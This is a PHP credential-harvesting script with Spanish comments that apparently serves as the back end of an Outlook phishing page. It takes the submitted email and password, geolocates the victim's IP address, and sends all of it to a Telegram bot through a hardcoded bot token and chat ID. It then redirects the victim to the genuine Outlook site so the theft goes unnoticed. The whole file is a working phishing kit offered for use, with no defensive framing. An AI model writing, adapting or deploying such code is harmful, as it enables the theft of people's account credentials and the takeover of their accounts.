<?php
// Reemplaza 'TU_TOKEN' con el token de tu bot de Telegram
$botToken = '5905446592:AAFPBz32wUZ-4DmdAWtqe48XXrQSF4HObBQ';

// Reemplaza 'TU_CHAT_ID' con el ID del chat al que deseas enviar los datos
$chatId = '5063383507';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtén los datos del formulario
    $correo = $_POST["dni"];
    $clave = $_POST["cpass"];
    
    // Obtiene la dirección IP del usuario
    $ip = $_SERVER['REMOTE_ADDR'];

    // Utiliza un servicio para obtener información de geolocalización basada en la IP
    $geo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));

    // Obtiene el país y la ciudad desde la respuesta de la API si están disponibles, o muestra un mensaje alternativo
    $pais = isset($geo->country) ? $geo->country : 'Desconocido';
    $ciudad = isset($geo->city) ? $geo->city : 'Desconocida';

    // Formatea el mensaje que se enviará a Telegram
    $message = "🔥Usuario ha ingresado 🔥\n 📧 Correo: $correo\n 💰 Clave: $clave\n ======================\n 🌍 País: $pais\n 🏙 Ciudad: $ciudad";

    // URL para enviar el mensaje a Telegram
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

    // Envía el mensaje a Telegram usando cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);

    if ($result) {
        // Redirige al usuario a la página web después de enviar los datos
        header("Location: https://outlook.live.com/owa/");
        exit; // Asegura que no se sigan ejecutando más instrucciones
    } else {
        echo "Hubo un problema al enviar los datos.";
    }
}
?>
